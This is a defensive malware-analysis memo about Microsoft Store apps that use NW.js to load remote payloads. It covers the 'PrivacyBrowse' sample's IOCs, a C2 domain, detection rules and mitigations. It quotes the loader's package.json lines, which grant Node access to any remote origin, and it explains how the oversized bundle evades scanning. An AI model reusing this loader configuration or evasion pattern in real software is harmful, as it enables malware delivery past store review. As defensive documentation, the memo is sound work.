---
name: microsoft-store-pua-pattern
description: Anonymous-publisher MSIX/AppX apps using NW.js remote-payload loaders to bypass Store malware scanning — pattern, IOCs, detection surface
type: reference
updated: 2026-04-16
updated_by: Claude (Opus 4.7 1M) + Alton
tags: [security/malware, security/defense, incident/privacybrowse]
related: [[2026-04-16_privacybrowse-static-analysis]]
originSessionId: d920f507-391d-4d21-9a8c-dce4bbe1c2fe
---
# Microsoft Store PUA pattern — NW.js remote-payload loaders

First observed locally: PrivacyBrowse MSIX, 2026-04-16. See [[2026-04-16_privacybrowse-static-analysis]] for the full teardown of the actual sample.

## The pattern in one paragraph

A "PUA-via-Store" package uses an **anonymous-GUID publisher** (unverified Partner Center account, e.g. `CN=E2014DE2-35CD-415B-AA3F-BC64B1D1F3B9`), bundles a full **NW.js** (Chromium + Node.js) runtime, declares `runFullTrust` and `<desktop:StartupTask Enabled="true">`, and delegates its entire app logic to a remote HTTPS URL via `"main": "https://..."` in the bundled `package.json`. The local sample is deliberately benign — all malicious behavior lives server-side and can be geofenced, A/B-tested, time-bombed, or swapped. Microsoft's Store malware scanning, SmartScreen reputation, and offline AV all find nothing actionable because the malicious bytes are never on disk. Server-side selectivity is the evasion.

## Why the package is ~125 MB (size as camouflage)

Legitimate apps that bundle a browser engine (Electron, NW.js, Tauri) are this big. The local files in the bundle — `nw.dll` (169 MB uncompressed), `node.dll` (16 MB), `icudtl.dat`, V8 context snapshot, Chromium `.pak` files, `node_modules/` — are real, unmodified Chromium + Node. The malicious control is a **~1 KB `package.json`** with three lines (`"main"`, `"nodejs"`, `"node-remote"`).

The bloat **is** the disguise:
- AV can't meaningfully signature-scan a 169 MB Chromium DLL.
- Store reviewers see "real engineering, hundreds of files, a browser engine" — pattern-matches to a legitimate product.
- The ~1 KB payload config vanishes in a forest of genuine third-party files.
- ZIP compression makes the on-wire MSIX ~124 MB; on-disk unpack balloons to ~308 MB.

**Size heuristic for defenders:** a "browser" or "privacy tool" at <50 MB or >200 MB with no mainstream reputation on SmartScreen / VirusTotal is suspect. Known-good reference points: WhatsApp Desktop Store stub ~1 MB (stub only), real Electron apps 100–200 MB, real NW.js apps 120–180 MB.

## The three killer lines

```json
{
  "main":        "https://pbcdn.privacybrowse.app/privacybrowse/src/browser.html",
  "nodejs":      true,
  "node-remote": "*://*"
}
```

1. `"main": "https://..."` — app boots from a remote URL every launch; local copy never holds the app code.
2. `"nodejs": true` — that remote HTML/JS runs with full Node.js context (`require`, `fs`, `child_process`, `os`, `net`).
3. `"node-remote": "*://*"` — Node access is granted to **any** origin loaded inside the runtime. A redirect or injected iframe hands Node to any third party.

Plus, from `AppxManifest.xml`:
- `<rescap:Capability Name="runFullTrust"/>` — full-trust desktop privileges.
- `<desktop:StartupTask Id="..." Enabled="true"/>` — auto-runs at every login.
- `Executable="...\PrivacyBrowse.exe" EntryPoint="Windows.FullTrustApplication"` — no AppContainer sandbox.

## IOCs (PrivacyBrowse family — expand as siblings land)

- **Publisher DN:** `CN=E2014DE2-35CD-415B-AA3F-BC64B1D1F3B9` (PrivacyBrowse leaf, short-lived Marketplace cert May 2024)
- **Issuer:** `CN=Microsoft Marketplace CA G 026, OU=EOC, O=Microsoft Corporation` (legitimate Microsoft Store signing)
- **C2 / payload host:** `pbcdn.privacybrowse.app` (Cloudflare-fronted: 104.21.35.249, 172.67.181.195, 2606:4700:30xx::…)
- **Parent domain:** `privacybrowse.app`
- **Affiliate ID prefix in `storage.json`:** `FT;` (seen in other NW.js PUA siblings)
- **MSIX SHA256:** `6BA8FE022212713FFAEC8940C3BD023E75528C4D2D00D1F69ACCB766BA241F15`
- **Package family:** `PrivacyBrowse.PrivacyBrowse_1.12.78.0_neutral__hz4wbnfrnhwdr`
- **NW.js version:** 0.78.2 (July 2023, Chromium 115 / Node 19)
- **Known sibling family names** (per PCrisk / ASEC / Trustwave reporting): PrivacyTabs, SunBrowser — generally `*Browse` / `*Tabs` naming.

## Stealer-family association

Server-side payload not captured locally (by design). Operationally consistent with the Lumma / Vidar / Rhadamanthys / StealC / RedLine / RisePro / SectopRAT / Atomic cluster based on `node_modules` set (`axios`, `form-data`, `tar`, `cheerio`, `universal-analytics`). PCrisk classifies PrivacyBrowse in this cluster. Specific family determination requires fetching the served payload.

## Detection surface (what to watch)

1. **Static, pre-install, on the MSIX:** YARA `NWjs_Remote_Loader_PackageJson` — matches `"main": "https://..."` + `"nodejs": true` + `"node-remote": "*://*"` co-occurrence. See `reference/nwjs-remote-loader.yar`.
2. **At install time, host events:** Sigma rule on `Microsoft-Windows-AppXDeployment-Server/Operational` for anonymous-GUID publisher + `runFullTrust` + `StartupTask`. See `reference/nwjs-remote-loader-msix.yml`.
3. **At runtime, process / network:** outbound HTTPS from an AppX-installed binary whose PE `OriginalFilename == "nw.exe"` but running process name differs. Any TLS to `*.app` domains from a StartupTask-launched AppX process is suspect.
4. **Telemetry quick-check (post-suspicion):** on Windows 10/11 with `EnablePrefetcher=3`, absence of `APPNAME.exe-*.pf` prefetch after an AppXDeployment install event = install staged but never executed. This was the disposition on Rocinante 2026-04-16.

## Operational mitigations

- DNS sinkhole / hosts-file block `*.privacybrowse.app` and any newly-observed sibling domains.
- Group Policy: prefer `AllowedAppxPackageSignatureOrigins` restricting installs to publishers with the Microsoft Store "Identity Verified" badge (blocks anonymous-GUID sideloads).
- Disable `AllowAllTrustedApps` on managed endpoints.
- Block outbound TLS from any MSIX-installed process whose PE `OriginalFilename` is `nw.exe` or `electron.exe` but whose binary has been renamed (low false-positive on a managed estate; higher on dev workstations).

## Why "just reverse the sample" doesn't pay off

The entire app logic is a remote fetch. Static analysis of the local MSIX tells you:
- How the loader works (this document).
- Publisher / cert chain / IOCs above.
- The fact that detonation is required to see any payload.

It cannot tell you which stealer family, which credential paths it targets, or where exfil goes — those live in the HTML/JS served at the C2 URL at detonation time, and can be geo-fenced, swapped, or taken down. Public multi-sandbox services (any.run, Hatching Triage, VirusTotal) run detonations at scale from varied geographies and publish reports; feed the SHA256 and read theirs rather than building in-house aquaria for a single PUA.

## References

- [[2026-04-16_privacybrowse-static-analysis]] — local incident, the analytical source for this memo
- Trustwave SpiderLabs: NW.js-packaged Lumma/Vidar loader writeups
- Picus Security: Microsoft Store malware abuse campaigns, 2024
- ASEC (AhnLab): Store-distributed infostealer analysis
- PCrisk: PrivacyBrowse family entry

## History

- 2026-04-16: Created from the PrivacyBrowse IR. Bumps on future sibling families go in IOCs section above.
